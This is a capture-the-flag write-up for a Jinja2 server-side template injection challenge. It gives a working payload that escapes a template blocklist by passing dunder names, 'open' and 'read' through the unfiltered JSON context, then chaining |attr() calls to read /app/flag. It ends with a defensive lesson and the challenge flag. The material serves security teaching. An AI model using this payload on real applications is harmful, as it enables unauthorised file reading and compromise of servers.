# Jinja Forge

## Write-up

This challenge is a **SSTI (Server-Side Template Injection)** in Jinja2, with a **filter on the template body** but **no filter on the context values** (JSON). The idea is to pass forbidden strings (`__class__`, `__globals__`, `open`, etc.) **via the context** and use only variable names and the `|attr()` filter in the template to build the call chain.

### Bypass idea

- The server blocks in the **template** patterns like `__class__`, `__globals__`, `open`, `read`, etc.
- The **values** in the JSON (context) are not filtered: you can send `"a1": "__class__"`, `"a2": "__mro__"`, etc.
- By writing `snippet|attr(a1)|attr(a2)[1]|attr(a3)()` in the template with `snippet=""`, you get the equivalent of `''.__class__.__mro__[1].__subclasses__()` without ever writing those strings in the template.

### Steps

1. **Understand the flow**  
   - A route renders a Jinja2 template with a context provided as JSON.  
   - The template is filtered by a blocklist; the context is not.

2. **Bypass the filter**  
   - Pass all sensitive strings in the context (e.g. `a1=__class__`, `a2=__mro__`, `a3=__subclasses__`, `a4=__init__`, `a5=__globals__`, `a6=open`, `a7=read`, `path=/app/flag`).  
   - In the template, use only variable names and `|attr(...)` to access attributes and call methods.

3. **Exploit chain**  
   - Start from `snippet` (empty string `""`) to get a Python object.  
   - Climb to the base class: `snippet|attr(a1)|attr(a2)[1]|attr(a3)()` → list of subclasses of `object`.  
   - Find a subclass whose `__init__.__globals__` contains `open` (often an index between 80 and 150, depending on Python version).  
   - Call `open(path)` then `.read()` by passing `path` and the method name `read` via the context (e.g. `a6=open`, `a7=read`), so you never write `open` or `read` in the template.

4. **Example context (JSON)**  
   - `snippet`: `""`  
   - `a1`: `"__class__"`, `a2`: `"__mro__"`, `a3`: `"__subclasses__"`, `a4`: `"__init__"`, `a5`: `"__globals__"`, `a6`: `"open"`, `a7`: `"read"`, `path`: `"/app/flag"`

5. **Example template**  
   - Once the index is found (e.g. 132), a possible template is:  
   `{{ ((snippet|attr(a1)|attr(a2)[1]|attr(a3)())[132]|attr(a4)|attr(a5).get(a6)(path)|attr(a7))() }}`  
   - The index may vary (80–150); you can determine it by first displaying the list of subclasses or by trying a few indices.

6. **Getting the flag**  
   - The flag is written to `/app/flag` at container startup. The rendered template output contains the flag.

### Concept

- Never trust a filter applied **only** to part of the input (here the template) when other input (the context) is injected into the same template engine without filtering.  
- In SSTI, the separation between "data" (context) and "code" (template) is artificial: both affect execution.

## Flag

`shellmates{s7i_byp4ss_v1a_c0nt3xt_p0llut10n}`
